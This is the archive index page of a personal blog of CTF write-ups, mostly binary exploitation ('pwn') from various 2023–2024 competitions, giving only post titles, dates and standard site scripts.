        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 58
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
        
            
            
            <div class="archive-year"> 2024 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/07</span>
            <a class="archive-post-title" href="/2024/09/07/byuctf-iot/">byuctf_iot</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/04</span>
            <a class="archive-post-title" href="/2024/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn/">羊城杯2024pwn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/02</span>
            <a class="archive-post-title" href="/2024/09/02/gdbjail/">gdbjail</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/31</span>
            <a class="archive-post-title" href="/2024/08/31/nss3rd%E5%87%BA%E9%A2%98-Iterator-Trap%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">nss3rd出题_Iterator_Trap解题思路</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/31</span>
            <a class="archive-post-title" href="/2024/08/31/srctf-pwn%E5%87%BA%E9%A2%98/">srctf_pwn出题</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/31</span>
            <a class="archive-post-title" href="/2024/08/31/xyctf/">xyctf</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/25</span>
            <a class="archive-post-title" href="/2024/08/25/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">羊城杯2023部分题目复现</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/22</span>
            <a class="archive-post-title" href="/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/">奇奇怪怪格式化字符串漏洞的利用1</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/08</span>
            <a class="archive-post-title" href="/2024/08/08/tfcctf2024/">tfcctf2024</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/01</span>
            <a class="archive-post-title" href="/2024/08/01/ImaginaryCTF/">ImaginaryCTF</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/22</span>
            <a class="archive-post-title" href="/2024/07/22/dasctf2024-summer-challenge/">dasctf2024_summer_challenge</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/15</span>
            <a class="archive-post-title" href="/2024/07/15/wkctf-pwn/">wkctf_pwn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/30</span>
            <a class="archive-post-title" href="/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/">d3ctf_pwnshell复现</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/25</span>
            <a class="archive-post-title" href="/2024/06/25/xctf-ggbord%E5%A4%8D%E7%8E%B0/">xctf_ggbord复现</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/19</span>
            <a class="archive-post-title" href="/2024/06/19/vsctf-pwn/">vsctf_pwn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/04</span>
            <a class="archive-post-title" href="/2024/06/04/litctf2024-pwn/">litctf2024_pwn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/30</span>
            <a class="archive-post-title" href="/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/">xctf_BuggyAllocator复现</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/27</span>
            <a class="archive-post-title" href="/2024/05/27/DragonKnightCTF-pwn/">DragonKnightCTF_pwn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/23</span>
            <a class="archive-post-title" href="/2024/05/23/xv6-and-unix-utilities/">xv6_and_unix_utilities</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/22</span>
            <a class="archive-post-title" href="/2024/05/22/ciscn-pwn/">ciscn_pwn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/15</span>
            <a class="archive-post-title" href="/2024/05/15/hnctf-pwn/">hnctf_pwn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/14</span>
            <a class="archive-post-title" href="/2024/05/14/miniL2024-pwn/">miniL2024_pwn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/28</span>
            <a class="archive-post-title" href="/2024/04/28/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bpwn%E6%96%B9%E5%90%91wp/">中国海洋大学信息安全竞赛pwn方向wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/28</span>
            <a class="archive-post-title" href="/2024/04/28/hznuctf/">hznuctf</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/24</span>
            <a class="archive-post-title" href="/2024/04/24/geekcon/">geekcon</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/31</span>
            <a class="archive-post-title" href="/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">尝试编译kernel和文件系统</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/27</span>
            <a class="archive-post-title" href="/2024/03/27/nkctf-wp/">nkctf_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/15</span>
            <a class="archive-post-title" href="/2024/03/15/CyberApocalypse-2024-Hacker-Royale-wp/">CyberApocalypse_2024_Hacker_Royale_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/10</span>
            <a class="archive-post-title" href="/2024/03/10/pearlctf-wp/">pearlctf_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/04</span>
            <a class="archive-post-title" href="/2024/03/04/osu-gaming-CTF-2024/">osu!gaming_CTF_2024</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/27</span>
            <a class="archive-post-title" href="/2024/02/27/hgame2024week3-wp/">hgame2024week3_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/25</span>
            <a class="archive-post-title" href="/2024/02/25/sictfr3-pwn-wp/">sictfr3_pwn_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/14</span>
            <a class="archive-post-title" href="/2024/02/14/hgame2024week2-pwn-wp/">hgame2024week2_pwn_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/14</span>
            <a class="archive-post-title" href="/2024/02/14/nssr18-wp/">nssr18_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/11</span>
            <a class="archive-post-title" href="/2024/02/11/0xl4ugh-pwn/">0xl4ugh_pwn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/07</span>
            <a class="archive-post-title" href="/2024/02/07/hgame2024week1-wp/">hgame2024week1_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/06</span>
            <a class="archive-post-title" href="/2024/02/06/beginctf2024-wp/">beginctf2024_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/31</span>
            <a class="archive-post-title" href="/2024/01/31/rw%E4%BD%93%E9%AA%8C%E8%B5%9Bwp/">rw体验赛wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/26</span>
            <a class="archive-post-title" href="/2024/01/26/nssctfr16-wp/">nssctfr16_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/24</span>
            <a class="archive-post-title" href="/2024/01/24/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bwp/">春秋杯冬季赛wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/19</span>
            <a class="archive-post-title" href="/2024/01/19/pwnable-tw/">pwnable.tw</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/18</span>
            <a class="archive-post-title" href="/2024/01/18/uoftctf-pwn-wp/">uoftctf_pwn_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/04</span>
            <a class="archive-post-title" href="/2024/01/04/pwnable-kr/">pwnable.kr</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/02</span>
            <a class="archive-post-title" href="/2024/01/02/cbctf/">cbctf</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> 2023 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/28</span>
            <a class="archive-post-title" href="/2023/12/28/GeekChallenge2023/">GeekChallenge2023</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/28</span>
            <a class="archive-post-title" href="/2023/12/28/hackergame2023/">Hackergame2023</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/28</span>
            <a class="archive-post-title" href="/2023/12/28/newstar2023-week1/">newstar2023_week1</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/28</span>
            <a class="archive-post-title" href="/2023/12/28/moectf-wp/">moectf_wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/29</span>
            <a class="archive-post-title" href="/2023/11/29/isctf/">isctf</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/05</span>
            <a class="archive-post-title" href="/2023/11/05/newstar-week2/">newstar_week2</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/21</span>
            <a class="archive-post-title" href="/2023/10/21/0xgame/">0xgame</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/26</span>
            <a class="archive-post-title" href="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/">exp本地不通远程通的问题</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/18</span>
            <a class="archive-post-title" href="/2023/09/18/cdn%E7%BB%95%E8%BF%87%E5%A4%A7%E5%85%A8tips%E6%80%9D%E8%B7%AF/">cdn绕过大全tips思路</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/18</span>
            <a class="archive-post-title" href="/2023/09/18/cnss2023/">cnss2023</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> Invalid date </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">Invalid date</span>
            <a class="archive-post-title" href="/2023/09/18/hello-world/">Hello World</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> 2023 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/18</span>
            <a class="archive-post-title" href="/2023/09/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">php弱类型</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/18</span>
            <a class="archive-post-title" href="/2023/09/18/python3-venv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8-%E8%A7%A3%E5%86%B3%E5%8C%85%E7%AE%A1%E7%90%86%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/">python3-venv虚拟环境使用-解决包管理版本控制混乱的问题</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/18</span>
            <a class="archive-post-title" href="/2023/09/18/sictf2023r2/">sictf2023</a>
        </li>
    
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
        
            <span class="sidebar-tag-name" data-tags="ctf writeup">
                <span class="iconfont-archer">&#xe606;</span>
                ctf writeup
            </span>
        
            <span class="sidebar-tag-name" data-tags="misc">
                <span class="iconfont-archer">&#xe606;</span>
                misc
            </span>
        
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
    </div> 
    <div class="sidebar-tags-list"></div>
</div>

        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>

    </div>
</div>

        <!-- site-meta -->
        <script>
    var siteMetaRoot = "/"
    if (siteMetaRoot === "undefined") {
        siteMetaRoot = '/'
    }
    var siteMeta = {
        url: "https://nyyyddddn.github.io",
        root: siteMetaRoot,
        author: "nyyyddddn"
    }
</script>

        <!-- import experimental options here -->
        <!-- Custom Font -->


        <!-- main func -->
        <script src="/scripts/main.js?v=20211217"></script>
        <!-- dark mode -->
        <script src="/scripts/dark.js?v=20211217"></script>
        <!-- fancybox -->
        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
        <!-- algolia -->
        
        <!-- busuanzi -->
        
            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
        
        <!-- CNZZ -->
        
        <!-- async load share.js -->
        
            <script src="/scripts/share.js?v=20211217" async></script>
        
        <!-- mermaid -->
        
    </body>
</html>
